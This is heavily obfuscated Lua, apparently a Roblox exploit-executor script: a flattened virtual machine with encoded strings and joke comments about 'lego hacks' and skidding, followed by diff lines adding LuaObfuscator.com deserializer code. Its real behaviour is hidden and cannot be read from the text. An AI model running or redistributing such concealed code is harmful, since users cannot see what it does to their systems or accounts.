end--[[https://soundcloud.com/shieldenergy]] end--[[(xA, qt, Sz) ha i broke ur regex]] end--[[loadstring = print (sukssesful deobfuskation)ðŸ˜ŽðŸ’…]] else if A<14481374 then if A<14399104 then if A<14335206 then aR=n[i("\051\050",22373167419748)]tR=F[aR]aR=C[J]CR=23374 NR=aR(CR)zR=tR[NR]A=4825747 tR=true LR=zR==tR iR=LR--[[what am i doing with my life? making lego hacks]] else N={K}A=F[n[i("\214\a\051\156\157\r\227\001\044\199\236\252",13534928744765)]]--[[https://soundcloud.com/shieldenergy]]end--[[loadstring = print (sukssesful deobfuskation)ðŸ˜ŽðŸ’…]] else if A<14421431 then KR=n[i("\255\208\054\163",17626009944095)]mR=F[KR]KR=C[J]VR=23391 JR=KR(VR)sR=mR[JR]mR=4442272183 LR=sR==mR A=LR and 817176 or 16425462--[[My uncle tickles me]] else A=D A=7568103 h=r--[[(xA, qt, Sz) ha i broke ur regex]] end--[[devfuscator free no virus 2021]] end--[[devfuscator free no virus 2021]] else if A<14586564 then if A<14555578 then A=F[n[i("\240\b\002\012\091\003\186\127\062\065\000\183\114",8284170984995)]]N={}--[[loadstring = print (sukssesful deobfuskation)ðŸ˜ŽðŸ’…]]else Vn[21]=n[i("\r",27019390083659)]NR=43 Vn[27]=n[i("\169",17775264612522)]nR=50 O=61 f=n[i("\171\194\107\245\094",5693152892086)]jR=n[i("\049",16503915494410)]V=F[f]f=n[i("\030\090\110\146\182\159",20017305962706)]xR=16 A=V[f]mR=n[i("\081",5119757259424)]S=6 Vn[20]=10 UR=25 lR=n[i("\179",16343923080053)]eR=33 V=A JR=n[i("\212",29183045888554)]MR=34 AR=47 Vn[5]=n[i("\145",30403927600795)]fR=n[i("\058",20627209931530)]VR=37 Vn[34]=2 g=n[i("\219",28086722029101)]E=n[i("\094",33638136674911)]qn=17 Vn[33]=n[i("\156",28625756874787)]Vn[10]=49 BR=n[i("\113",21506631323197)]uR=39 rR=n[i("\028",18261684503151)]U=n[i("\207\240\176\012\141",5576111461449)]Y=n[i("\a",30127967530394)]X=n[i("\194\182\132\210\132\220",10580974839422)]Vn[18]=56 vR=n[i("\026",24460585228540)]Vn[2]=32 A=C[x]Vn[30]=1 Vn[22]=7 Vn[39]=n[i("\251",28297181849329)]b=20 gR=n[i("\184",23625188595186)]Vn[29]=n[i("\093",27149316809412)]Vn[14]=48 YR=n[i("\166",409108119933)]KR=62 PR=n[i("\048",8159613132207)]y=F[U]U=n[i("\178\178\145\105\147\164",19849797126198)]f=A o=n[i("\129\136\004\004\072\085",22746840978112)]Vn[16]=30 r=n[i("\012",17168581967477)]A=y[U]Z=55 y=A U=F[o]zR=n[i("\027",7777349377099)]Vn[13]=n[i("\186",6353524266781)]Vn[26]=9 kR=n[i("\t",18721260028955)]QR=57 G=n[i("\199",5896096290163)]qR=n[i("\162",19347270616674)]bR=46 v=n[i("\181",33775579822815)]o=n[i("\a\231\058\130",10169719170303)]LR=28 Fn=22 A=U[o]Vn[25]=n[i("\197",15269074712460)]aR=n[i("\242",23652032960011)]Vn[15]=n[i("\078",8047940574535)]XR=n[i("\255",13151591215064)]Vn[6]=11 An=n[i("\061",3856998338056)]nn=n[i("\054",1575227327931)]M=n[i("\119\222\000\176\242\149",12104660986889)]HR=40 Jn=35 o=n[i("\166\014\084\n",1198332445788)]Vn[35]=n[i("\091",35009346830172)]Vn[40]=52 D=41 Vn[4]=53 Ln=n[i("\018",4782592037222)]DR=8 R=14 T=59 CR=n[i("\246",27856934266199)]Vn[17]=n[i("\223",22481618653641)]Vn[7]=n[i("\177",95565938777)]Vn[8]=51 U=A mn=29 A=F[o]tn=n[i("\188",22788718187239)]k=F[M]iR=n[i("\166",22728586810031)]Vn[19]=n[i("\211",32553624335981)]Vn[1]=n[i("\124",19141105894818)]yR=31 Vn[11]=n[i("\000",34534738460066)]M=n[i("\071\022\206",10436015269367)]o=A ER=n[i("\207",15509600221292)]A=k[M]Vn[3]=n[i("\147",11376641812835)]sn=n[i("\023",16879736601960)]IR=n[i("\075",29905696189643)]zn=18 d=60 k=A M=F[X]Vn[24]=26 Kn=n[i("\044",34015031557054)]TR=44 GR=n[i("\238",6940878969152)]X=n[i("\058\065\110",16659612810395)]I=n[i("\070",3872031182358)]FR=n[i("\150",6999936571767)]A=M[X]Vn[28]=15 M=A Q=38 cR=45 Vn[31]=n[i("\014",8946689908876)]w=24 wR=63 hR=n[i("\163",23522106234258)]oR=n[i("\205",19206606144991)]an=3 j=n[i("\212",16573710842955)]RR=5 h=n[i("\120",27140726612668)]Vn[23]=n[i("\167",31678498042686)]SR=19 Nn=n[i("\163",5332364628838)]sR=4 Vn[12]=13 dR=23 X=n[i("\144",28125377914449)]pR=n[i("\108",7176035605019)]tR=12 H=58 W=n[i("\067",27778548720910)]Vn[37]=n[i("\158",21286507531632)]Vn[36]=54 Vn[9]=n[i("\231",1107061605383)]WR=n[i("\233",30442583486143)]ZR=21 OR=27 Vn[38]=0 Vn[32]=36 Cn=42 A={[X]=b;[h]=Q,[r]=D;[G]=R;[W]=Z;[j]=S,[v]=H;[I]=d;[Y]=O;[g]=w;[E]=T;[iR]=nR;[FR]=AR,[qR]=LR,[zR]=tR,[aR]=NR;[CR]=sR,[mR]=KR;[JR]=VR;[PR]=uR;[BR]=cR;[pR]=eR,[lR]=xR;[fR]=yR;[kR]=MR,[oR]=UR;[XR]=bR,[hR]=QR;[rR]=DR,[GR]=RR;[WR]=ZR;[jR]=SR;[vR]=HR,[IR]=dR;[YR]=OR,[gR]=wR;[ER]=TR,[nn]=Fn,[An]=qn,[Ln]=zn,[tn]=an;[Nn]=Cn,[sn]=mn,[Kn]=Jn,[Vn[1]]=Vn[2];[Vn[3]]=Vn[4],[Vn[5]]=Vn[6],[Vn[7]]=Vn[8];[Vn[9]]=Vn[10];[Vn[11]]=Vn[12],[Vn[13]]=Vn[14];[Vn[15]]=Vn[16];[Vn[17]]=Vn[18],[Vn[19]]=Vn[20];[Vn[21]]=Vn[22],[Vn[23]]=Vn[24];[Vn[25]]=Vn[26],[Vn[27]]=Vn[28],[Vn[29]]=Vn[30],[Vn[31]]=Vn[32];[Vn[33]]=Vn[34];[Vn[35]]=Vn[36],[Vn[37]]=Vn[38];[Vn[39]]=Vn[40]}X=A h=n[i("\098\033\246\078",11563478592017)]b=F[h]h=n[i("\074\186\116\103\038",22230355398879)]A=b[h]Q=#f r=Q Q=1 D=Q b=A Q=0 G=D<Q h=1 A=20480 Q=h-D--[[real moonsec v4!11ðŸ˜²ðŸ¤¯]] end--[[Override certified boronide fork]] else A=4727440--[[what am i doing with my life? making lego hacks]] end--[[rubi was here]] end--[[im telling my mommy ðŸ˜¤]] end--[[rubi was here]] end--[[https://soundcloud.com/shieldenergy]] else if A<15623234 then if A<15035980 then if A<14761632 then if A<14712393 then if A<14685700 then A=j<=W A=A and 5662381 or 15033291--[[loadstring = print (sukssesful deobfuskation)ðŸ˜ŽðŸ’…]] else K=nil N={}A=F[n[i("\195\066\092\182\139\211\151\073\050\111\203\220",13356682162327)]]x=nil--[[Mitochondria is the powerhouse of the cell]] end--[[Override certified boronide fork]] else if A<14754582 then A=true A=A and 3673712 or 3454057--[[devfuscator free no virus 2021]] else T=n[i("\048\104\111\211",15869314709947)]w=F[T]A=7277278 T=C[J]nR=23424 iR=T(nR)g=w[iR]iR=23387 w=C[J]T=w(iR)Z=g[T]g=n[i("\124\000\025\006",32809182689115)]g=Z[g]g=g(Z)G=g--[[My uncle tickles me]] end--[[Mitochondria is the powerhouse of the cell]] end--[[https://soundcloud.com/shieldenergy]] else if A<14909593 then if A<14794753 then A=8922896--[[free source code: dariandev.com/discord]] else x=n[i("\206\213\178\001",34503598996869)]A=F[x]x=A()A=16713727--[[who the fuck uses mee6]] end--[[Mitochondria is the powerhouse of the cell]] else if A<15001558 then I=not H j=j+v W=j<=S W=I and W I=j>=S I=H and I W=I or W I=9222425 A=W and I W=12304248 A=A or W--[[Please do not the skid. ]] else S=nil H=V(Z)A=5975734 Z=nil f[h]=H v=nil W=nil j=nil--[[someone stole my credit card now i cant buy peopleðŸ˜­ðŸ˜­ðŸ˜­]] end--[[who the fuck uses mee6]] end--[[https://soundcloud.com/shieldenergy]] end--[[what am i doing with my life? making lego hacks]] else if A<15308100 then if A<15108742 then if A<15067318 then T=n[i("\157\161\078\231",4217786601304)]tR=23424 Z=F[T]iR=.1 nR=n[i("\079\102\213\210",2360156555414)]T=Z(iR)iR=F[nR]nR=n[i("\109\079\081\248\168\161\049\125\247\147",34542254882217)]nR=iR[nR]LR=C[J]zR={LR(tR)}nR=nR(iR,q(zR))iR=C[J]zR=23392 LR=iR(zR)T=nR[LR]iR=C[J]LR=23409 nR=iR(LR)Z=T[nR]LR=23502 iR=C[J]nR=iR(LR)T=n[i("\160\091\171\173\076\058\118\163\235\236\192\109",32223975535930)]iR=9000000000 T=Z[T]T=T(Z,nR,iR)LR=23463 iR=C[J]Z=n[i("\052\178\219\020\001\193\057\076\v\193\073\074\243\078",26002525544088)]nR={iR(LR)}Z=T[Z]Z=Z(T,q(nR))A=Z and 375819 or 5616299--[[hey psst you the wrapper function is right there]] else A=3339366--[[real moonsec v4!11ðŸ˜²ðŸ¤¯]] end--[[mee6 what are you doing to my wife]] else if A<15252968 then j=h==D W=j A=16453623--[[Please do not the skid. ]] else s=nil A=8845582 C[z[6]]=N--[[whats a jmesðŸ¤”]] end--[[mee6 what are you doing to my wife]] end--[[Mitochondria is the powerhouse of the cell]] else if A<15442999 then if A<15383945 then A=b and 6236862 or 15439832--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]] else Q=n[i("\028\002\077\033",32157401511164)]h=F[Q]Q=h()D=C[z[2]]R=23389 r=D[M]D=C[z[1]]G=D(R)h=r[G]b=Q-h h=7200 A=b>h A=A and 13422490 or 14607294--[[Mitochondria is the powerhouse of the cell]] end--[[Evon is not a bitcoin miner real]] else if A<15468036 then A=false N={A}A=F[n[i("\037\242\221\254\049\210\072\020\'\204\195\201",13821626561096)]]--[[someone stole my credit card now i cant buy peopleðŸ˜­ðŸ˜­ðŸ˜­]]else A=true C[z[1]]=A N={}A=F[n[i("\122\188\116\146\004\197\n\086\099\142\068\040\001",22313036042540)]]--[[Mitochondria is the powerhouse of the cell]]end--[[mee6 what are you doing to my wife]] end--[[who the fuck uses mee6]] end--[[Evon is not a bitcoin miner real]] end--[[the person who made this script ip grabbed a gorilla]] else if A<16441425 then if A<15972691 then if A<15834947 then if A<15795760 then X=C[k]M=X A=12672387--[[loadstring = print (sukssesful deobfuskation)ðŸ˜ŽðŸ’…]] else N=n[i("\000\104\122\129\227\110\098\038\042\132\178\021\229\220\153\213\207\b\005\180\147\042\191 ",10884853049241)]A=C[s]N=A[N]V=23388 x=C[z[1]]J={x(V)}x=u(1782838,{s,z[1];z[2]})N=N(A,q(J))A=n[i("\155\b\169\184\041\006\n",10089186075828)]A=N[A]A=A(N,x)A=12853129--[[Evon is not a bitcoin miner real]] end--[[what am i doing with my life? making lego hacks]] else if A<15897581 then zR=n[i("\080\092\255\188",8575163899698)]T=A aR=23391 LR=F[zR]zR=C[J]tR=zR(aR)nR=LR[tR]LR=7449423635 iR=nR==LR A=iR and 5020825 or 13545886 Z=iR--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]] else A=12380538 f=nil y=nil--[[what am i doing with my life? making lego hacks]] end--[[loadstring = print (sukssesful deobfuskation)ðŸ˜ŽðŸ’…]] end--[[rubi was here]] else if A<16067258 then if A<16020126 then tR=n[i("\079\195\212",17995388404087)]tR=T[tR]CR=23355 aR=C[J]NR={aR(CR)}tR=tR(T,q(NR))zR=A A=tR and 14144944 or 12590464 LR=tR--[[mee6 what are you doing to my wife]] else A=x(U)y=V A=11054930 y=nil U=nil--[[rubi was here]] end--[[mee6 what are you doing to my wife]] else if A<16419168 then o=255 K=x U=0 A=C[z[1]]y=A(U,o)s[K]=y K=nil A=5665453--[[who the fuck uses mee6]] else KR=n[i("\025\182\112\086",13152664989657)]mR=F[KR]VR=23391 KR=C[J]JR=KR(VR)sR=mR[JR]mR=2753915549 LR=sR==mR A=LR and 16633852 or 13043086--[[mee6 what are you doing to my wife]] end--[[mee6 what are you doing to my wife]] end--[[im telling my mommy ðŸ˜¤]] end--[[My uncle tickles me]] else if A<16532914 then if A<16464432 then if A<16453769 then C[V]=W A=C[V]A=A and 14764483 or 1083425--[[im telling my mommy ðŸ˜¤]] else x=C[z[7]]K=x==s N=K A=15260626--[[im telling my mommy ðŸ˜¤]] end--[[Override certified boronide fork]] else if A<16494403 then o=23362 f=n[i("\110-\244\091\000",1599924143570)]A=F[f]y=C[J]U={y(o)}N={}f=A(q(U))A=F[n[i("\166\063\113\178\054\147\088\062\175\237\178\067\242",34767747546747)]]--[[the person who made this script ip grabbed a gorilla]]else y=not f x=x+V N=x<=J N=y and N y=x>=J y=f and y N=y or N y=12545407 A=N and y N=11392348 A=A or N--[[someone stole my credit card now i cant buy peopleðŸ˜­ðŸ˜­ðŸ˜­]] end--[[free source code: dariandev.com/discord]] end--[[My uncle tickles me]] else if A<16649107 then if A<16582276 then A=g A=O and 247815 or 11767655--[[My uncle tickles me]] else sR=C[J]hR=23491 eR=n[i("\094\098\244\172",20605734439670)]KR=23379 mR=sR(KR)UR=23468 sR=C[J]VR=23365 JR=23482 KR=sR(JR)uR=23422 xR=23424 sR=C[J]JR=sR(VR)VR=C[J]fR=23385 PR=VR(uR)pR=F[eR]eR=C[J]lR=eR(xR)cR=pR[lR]pR=C[J]lR=23392 eR=pR(lR)BR=cR[eR]cR=C[J]kR=23477 eR=23420 pR=cR(eR)uR=BR[pR]pR=23351 BR=C[J]cR=BR(pR)VR=uR..cR cR=23345 xR=23335 sR=PR..VR VR=C[J]uR=23426 PR=VR(uR)uR=C[J]VR=10181046 BR=uR(cR)pR=C[J]lR=23413 eR=pR(lR)pR=C[J]lR=pR(xR)pR=C[J]xR=pR(fR)A=13043086 fR=C[J]yR=fR(kR)XR=n[i("\046\244\149\053",4284360626070)]MR=C[J]oR=MR(UR)kR=iR[oR]MR=C[J]UR=23371 oR=MR(UR)fR=kR..oR pR=yR..fR kR=23349 cR={[eR]=lR;[xR]=pR}xR=23413 eR=C[J]lR=eR(xR)eR=C[J]fR=23415 yR=23385 xR=eR(fR)eR=C[J]fR=eR(yR)eR=C[J]yR=eR(kR)pR={[lR]=xR,[fR]=yR}lR=C[J]fR=23413 yR=23386 xR=lR(fR)oR=23435 kR=23385 lR=C[J]fR=lR(yR)lR=C[J]yR=lR(kR)kR=C[J]MR=kR(oR)UR=F[XR]XR=C[J]bR=XR(hR)oR=UR[bR]bR=23458 UR=C[J]XR=UR(bR)kR=oR..XR lR=MR..kR eR={[xR]=fR,[yR]=lR}xR=23466 uR={cR;pR,eR}eR=23338 cR=C[J]pR=cR(eR)eR=C[J]lR=eR(xR)xR=C[J]yR=23393 fR=xR(yR)yR=C[J]MR=23432 kR=yR(MR)xR=NR..kR eR=fR..xR cR={[lR]=eR}LR={[mR]=KR;[JR]=sR;[PR]=VR,[BR]=uR,[pR]=cR}mR=n[i("\139\074\164\018\046\065\155\021\187\051\243\131\230\125\094\132",7471323618094)]sR=F[mR]mR=sR(CR,LR)LR=nil--[[Obfuscated with luaobfuscator.com]] end--[[Aztupbrew aka skiddware ðŸ™Œ]] else x=K()A=not x A=A and 14820293 or 11447134--[[Please do not the skid. ]] end--[[free source code: dariandev.com/discord]] end--[[Evon is not a bitcoin miner real]] end--[[Override certified boronide fork]] end--[[https://soundcloud.com/shieldenergy]] end--[[real moonsec v4!11ðŸ˜²ðŸ¤¯]] end--[[https://soundcloud.com/shieldenergy]] end--[[Mitochondria is the powerhouse of the cell]] end A=#t return q(N)--[[https://soundcloud.com/shieldenergy]]end,function(i)--[[Please do not the skid. ]]s[i]=s[i]-1 if 0==s[i]then s[i],C[i]=nil,nil--[[someone stole my credit card now i cant buy peopleðŸ˜­ðŸ˜­ðŸ˜­]] end--[[im telling my mommy ðŸ˜¤]] end,{}return(u(12961164,{}))(q(N))--[[free source code: dariandev.com/discord]]end)(getfenv and getfenv()or _ENV,unpack or table[n[i("~\037\005\072\162\154",10148243678443)]],newproxy,setmetatable,getmetatable,select,{...})--[[who the fuck uses mee6]]end)(...)
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.2.8) ~  Much Love, Ferib 
+
+]]--
+
+do
+	local v0 = tonumber;
+	local v1 = string.byte;
+	local v2 = string.char;
+	local v3 = string.sub;
+	local v4 = string.gsub;
+	local v5 = string.rep;
+	local v6 = table.concat;
+	local v7 = table.insert;
+	local v8 = math.ldexp;
+	local v9 = getfenv or function()
+		return _ENV;
+	end;
+	local v10 = setmetatable;
+	local v11 = pcall;
+	local v12 = select;
+	local v13 = unpack or table.unpack;
+	local v14 = tonumber;
+	local function v15(v16, v17, ...)
+		local v18 = 0;
+		local v19;
+		local v20;
+		local v21;
+		local v22;
+		local v23;
+		local v24;
+		local v25;
+		local v26;
+		local v27;
+		local v28;
+		local v29;
+		local v30;
+		while true do
+			if (v18 == 5) then
+				v27 = v24;
+				v28 = nil;
+				function v28(...)
+					return {...}, v12("#", ...);
+				end
+				v18 = 6;
+			end
+			if (v18 == 1) then
+				v21 = nil;
+				function v21(v31, v32, v33)
+					if v33 then
+						local v70 = 0 - 0;
+						local v71;
+						while true do
+							if (v70 == (568 - (367 + 201))) then
+								v71 = (v31 / (((1046 - (32 + 85)) - (214 + 713)) ^ (v32 - (1 + 0)))) % (2 ^ (((v33 - (2 - 1)) - (v32 - (878 - (282 + 584 + 11)))) + (1 - 0)));
+								return v71 - (v71 % (1 + 0));
+							end
+						end
+					else
+						local v72 = (4 - 2) ^ (v32 - (1066 - (68 + 222 + 775)));
+						return (((v31 % (v72 + v72)) >= v72) and (1271 - (226 + 1044))) or ((1576 - (892 + 65)) - (555 + 64));
+					end
+				end
+				v22 = nil;
+				v18 = 2;
+			end
+			if (v18 == 3) then
+				v24 = nil;
+				function v24()
+					local v34 = 0;
+					local v35;
+					local v36;
+					local v37;
+					local v38;
+					while true do
+						if (v34 == (0 - 0)) then
+							v35, v36, v37, v38 = v1(v16, v19, v19 + (5 - 2));
+							v19 = v19 + (7 - (3 + 0));
+							v34 = 351 - (87 + 263);
+						end
+						if (v34 == (181 - (67 + 113))) then
+							return (v38 * (12302277 + 4474939)) + (v37 * 65536) + (v36 * (628 - 372)) + v35;
+						end
+					end
+				end
+				v25 = nil;
+				v18 = 4;
+			end
+			if (v18 == 6) then
+				v29 = nil;
+				function v29()
+					local v39 = 0 - 0;
+					local v40;
+					local v41;
+					local v42;
+					local v43;
+					local v44;
+					local v45;
+					local v46;
+					while true do
+						if ((264 - (241 + 20)) ~= v39) then
+						else
+							v46 = nil;
+							while true do
+								local v78 = 0;
+								while true do
+									if (v78 ~= 1) then
+									else
+										if (v40 == (3 - 0)) then
+											local v102 = 0 + 0;
+											while true do
+												if (v102 == (0 + 0)) then
+													local v109 = 0;
+													while true do
+														if (v109 == (438 - (262 + 176))) then
+															for v151 = 1722 - (345 + 1376), v24() do
+																v42[v151 - (1 + 0)] = v29();
+															end
+															return v44;
+														end
+													end
+												end
+											end
+										end
+										if (v40 ~= 2) then
+										else
+											local v103 = 688 - (198 + 490);
+											while true do
+												if (v103 == (1501 - (1408 + 92))) then
+													for v114 = 1087 - (461 + 625), v24() do
+														local v115 = 0 - 0;
+														local v116;
+														local v117;
+														while true do
+															if (v115 ~= 1) then
+															else
+																while true do
+																	if (0 == v116) then
+																		v117 = v22();
+																		if (v21(v117, 1, 1289 - (993 + 295)) == 0) then
+																			local v160 = 0 - 0;
+																			local v161;
+																			local v162;
+																			local v163;
+																			local v164;
+																			local v165;
+																			while true do
+																				if (v160 ~= (1207 - (696 + 510))) then
+																				else
+																					v163 = nil;
+																					v164 = nil;
+																					v160 = 3 - 1;
+																				end
+																				if ((1171 - (418 + 753)) == v160) then
+																					v161 = 0 + 0;
+																					v162 = nil;
+																					v160 = 1 + 0;
+																				end
+																				if ((1 + 1) == v160) then
+																					v165 = nil;
+																					while true do
+																						if (v161 == (0 + 0)) then
+																							local v166 = 529 - (406 + 123);
+																							while true do
+																								if (v166 == (1770 - (1749 + 20))) then
+																									v161 = 1263 - (1091 + 171);
+																									break;
+																								end
+																								if (v166 ~= (0 + 0)) then
+																								else
+																									v162 = 1322 - (1249 + 73);
+																									v163 = nil;
+																									v166 = 1;
+																								end
+																							end
+																						end
+																						if ((1 + 0) == v161) then
+																							local v167 = 0 - 0;
+																							while true do
+																								if (v167 == 1) then
+																									v161 = 6 - 4;
+																									break;
+																								end
+																								if (v167 ~= (374 - (123 + 251))) then
+																								else
+																									v164 = nil;
+																									v165 = nil;
+																									v167 = 4 - 3;
+																								end
+																							end
+																						end
+																						if (v161 ~= (700 - (208 + 490))) then
+																						else
+																							while true do
+																								if (v162 == (0 + 0)) then
+																									local v168 = 0 + 0;
+																									local v169;
+																									local v170;
+																									while true do
+																										if (v168 ~= (1 + 0)) then
+																										else
+																											while true do
+																												if (v169 == (0 + 0)) then
+																													v170 = 0 - 0;
+																													while true do
+																														if (v170 ~= 0) then
+																														else
+																															local v183 = 836 - (660 + 176);
+																															while true do
+																																if (v183 ~= (0 + 0)) then
+																																else
+																																	v163 = v21(v117, 2, 205 - (14 + 188));
+																																	v164 = v21(v117, 679 - (534 + 141), 120 - (4 + 110));
+																																	v183 = 1 + 0;
+																																end
+																																if (v183 ~= (1 + 0)) then
+																																else
+																																	v170 = 1 + 0;
+																																	break;
+																																end
+																															end
+																														end
+																														if (v170 ~= (104 - (17 + 86))) then
+																														else
+																															v162 = 1 - 0;
+																															break;
+																														end
+																													end
+																													break;
+																												end
+																											end
+																											break;
+																										end
+																										if (v168 == (0 - 0)) then
+																											v169 = 0 + 0;
+																											v170 = nil;
+																											v168 = 1;
+																										end
+																									end
+																								end
+																								if (v162 == (1 - 0)) then
+																									local v171 = 0 - 0;
+																									while true do
+																										if (v171 ~= (1 + 0)) then
+																										else
+																											v162 = 2;
+																											break;
+																										end
+																										if (v171 == (0 - 0)) then
+																											local v176 = 166 - (122 + 44);
+																											local v177;
+																											while true do
+																												if (v176 ~= (0 + 0)) then
+																												else
+																													v177 = 396 - (115 + 281);
+																													while true do
+																														if (v177 == (0 - 0)) then
+																															v165 = {v23(),v23(),nil,nil};
+																															if (v163 == 0) then
+																																local v184 = 0 - 0;
+																																local v185;
+																																while true do
+																																	if (v184 ~= 0) then
+																																	else
+																																		v185 = 0 - 0;
+																																		while true do
+																																			if (0 ~= v185) then
+																																			else
+																																				v165[870 - (550 + 317)] = v23();
+																																				v165[5 - 1] = v23();
+																																				break;
+																																			end
+																																		end
+																																		break;
+																																	end
+																																end
+																															elseif (v163 == (66 - (30 + 35))) then
+																																v165[3 - 0] = v24();
+																															elseif (v163 == (5 - 3)) then
+																																v165[1260 - (1043 + 214)] = v24() - ((7 - 5) ^ (1228 - (323 + 889)));
+																															elseif (v163 == (288 - (134 + 151))) then
+																																local v190 = 1665 - (970 + 695);
+																																local v191;
+																																while true do
+																																	if (0 == v190) then
+																																		v191 = 0 - 0;
+																																		while true do
+																																			if (v191 ~= (1990 - (582 + 1408))) then
+																																			else
+																																				v165[10 - 7] = v24() - ((582 - (361 + 219)) ^ (19 - 3));
+																																				v165[4] = v23();
+																																				break;
+																																			end
+																																		end
+																																		break;
+																																	end
+																																end
+																															end
+																															v177 = 321 - (53 + 267);
+																														end
+																														if ((3 - 2) ~= v177) then
+																														else
+																															v171 = 414 - (15 + 398);
+																															break;
+																														end
+																													end
+																													break;
+																												end
+																											end
+																										end
+																									end
+																								end
+																								if (v162 == 3) then
+																									if (v21(v164, 1827 - (1195 + 629), 3 - 0) ~= (983 - (18 + 964))) then
+																									else
+																										v165[4] = v46[v165[14 - 10]];
+																									end
+																									v41[v114] = v165;
+																									break;
+																								end
+																								if (v162 ~= (243 - (187 + 54))) then
+																								else
+																									local v173 = 780 - (162 + 618);
+																									while true do
+																										if (v173 == (1 + 0)) then
+																											v162 = 3 + 0;
+																											break;
+																										end
+																										if (v173 ~= (0 + 0)) then
+																										else
+																											local v178 = 0 - 0;
+																											while true do
+																												if ((0 - 0) == v178) then
+																													if (v21(v164, 1 + 0, 739 - (542 + 196)) == (1 - 0)) then
+																														v165[1638 - (1373 + 263)] = v46[v165[2]];
+																													end
+																													if (v21(v164, 2, 2 + 0) ~= 1) then
+																													else
+																														v165[2 + 1] = v46[v165[1003 - (451 + 549)]];
+																													end
+																													v178 = 1 + 0;
+																												end
+																												if (v178 == (1 - 0)) then
+																													v173 = 1 - 0;
+																													break;
+																												end
+																											end
+																										end
+																									end
+																								end
+																							end
+																							break;
+																						end
+																					end
+																					break;
+																				end
+																			end
+																		end
+																		break;
+																	end
+																end
+																break;
+															end
+															if (v115 == (1551 - (1126 + 425))) then
+																v116 = 405 - (118 + 287);
+																v117 = nil;
+																v115 = 3 - 2;
+															end
+														end
+													end
+													v40 = 1387 - (746 + 638);
+													break;
+												end
+												if (v103 ~= 0) then
+												else
+													for v118 = 1 + 0, v45 do
+														local v119 = 0;
+														local v120;
+														local v121;
+														local v122;
+														while true do
+															if (v119 ~= (1122 - (118 + 1003))) then
+															else
+																v122 = nil;
+																while true do
+																	if (v120 ~= (0 - 0)) then
+																	else
+																		local v158 = 0;
+																		while true do
+																			if (v158 ~= (342 - (218 + 123))) then
+																			else
+																				v120 = 1;
+																				break;
+																			end
+																			if ((1581 - (1535 + 46)) ~= v158) then
+																			else
+																				v121 = v22();
+																				v122 = nil;
+																				v158 = 1 + 0;
+																			end
+																		end
+																	end
+																	if (v120 ~= (1 + 0)) then
+																	else
+																		if (v121 == (4 - 3)) then
+																			v122 = v22() ~= 0;
+																		elseif (v121 == (562 - (306 + 254))) then
+																			v122 = v25();
+																		elseif (v121 == (1 + 2)) then
+																			v122 = v26();
+																		end
+																		v46[v118] = v122;
+																		break;
+																	end
+																end
+																break;
+															end
+															if (v119 == (0 - 0)) then
+																local v153 = 0 - 0;
+																while true do
+																	if (v153 == (1467 - (899 + 568))) then
+																		v120 = 0 + 0;
+																		v121 = nil;
+																		v153 = 1;
+																	end
+																	if (v153 ~= (1 + 0)) then
+																	else
+																		v119 = 1 + 0;
+																		break;
+																	end
+																end
+															end
+														end
+													end
+													v44[3] = v22();
+													v103 = 1;
+												end
+											end
+										end
+										break;
+									end
+									if (v78 ~= 0) then
+									else
+										if (v40 ~= (1 + 0)) then
+										else
+											v44 = {v41,v42,nil,v43};
+											v45 = v24();
+											v46 = {};
+											v40 = 4 - 2;
+										end
+										if (v40 == (0 - 0)) then
+											local v104 = 603 - (268 + 335);
+											while true do
+												if (v104 == (290 - (60 + 230))) then
+													v41 = {};
+													v42 = {};
+													v104 = 754 - (239 + 514);
+												end
+												if (v104 == (573 - (426 + 146))) then
+													v43 = {};
+													v40 = 1 + 0;
+													break;
+												end
+											end
+										end
+										v78 = 1457 - (282 + 1174);
+									end
+								end
+							end
+							break;
+						end
+						if (v39 ~= 1) then
+						else
+							v42 = nil;
+							v43 = nil;
+							v39 = 813 - (569 + 242);
+						end
+						if (v39 == (5 - 3)) then
+							v44 = nil;
+							v45 = nil;
+							v39 = 3 + 0;
+						end
+						if (v39 == (0 + 0)) then
+							v40 = 1024 - (706 + 318);
+							v41 = nil;
+							v39 = 1252 - (721 + 530);
+						end
+					end
+				end
+				v30 = nil;
+				v18 = 7;
+			end
+			if (v18 == 4) then
+				function v25()
+					local v47 = v24();
+					local v48 = v24();
+					local v49 = 732 - (476 + 255);
+					local v50 = (v21(v48, 1131 - (369 + 761), 12 + 8) * (2 ^ (57 - 25))) + v47;
+					local v51 = v21(v48, 39 - (14 + 4), 269 - (64 + 174));
+					local v52 = ((v21(v48, 5 + 27) == (1 - 0)) and -1) or (337 - (144 + 192));
+					if (v51 == (216 - (42 + 174))) then
+						if (v50 == ((1975 - (1913 + 62)) + 0)) then
+							return v52 * (0 + 0);
+						else
+							v51 = 1 + 0 + 0;
+							v49 = 0 - 0;
+						end
+					elseif (v51 == 2047) then
+						return ((v50 == (1504 - (363 + 1141))) and (v52 * ((1581 - (1183 + 397)) / 0))) or (v52 * NaN);
+					end
+					return v8(v52, v51 - (3114 - 2091)) * (v49 + (v50 / ((2 + (1933 - (565 + 1368))) ^ 52)));
+				end
+				v26 = nil;
+				function v26(v53)
+					local v54;
+					if not v53 then
+						v53 = v24();
+						if (v53 == (0 - 0)) then
+							return "";
+						end
+					end
+					v54 = v3(v16, v19, (v19 + v53) - (1662 - (1477 + 184)));
+					v19 = v19 + v53;
+					local v55 = {};
+					for v68 = 857 - (564 + 292), #v54 do
+						v55[v68] = v2(v1(v3(v54, v68, v68)));
+					end
+					return v6(v55);
+				end
+				v18 = 5;
+			end
+			if (v18 == 2) then
+				function v22()
+					local v56 = 0 - 0;
+					local v57;
+					while true do
+						if (v56 == (2 - 1)) then
+							return v57;
+						end
+						if ((304 - (244 + (1061 - (938 + 63)))) == v56) then
+							v57 = v1(v16, v19, v19);
+							v19 = v19 + 1 + 0;
+							v56 = 477 - (41 + 435);
+						end
+					end
+				end
+				v23 = nil;
+				function v23()
+					local v58, v59 = v1(v16, v19, v19 + 2 + 0);
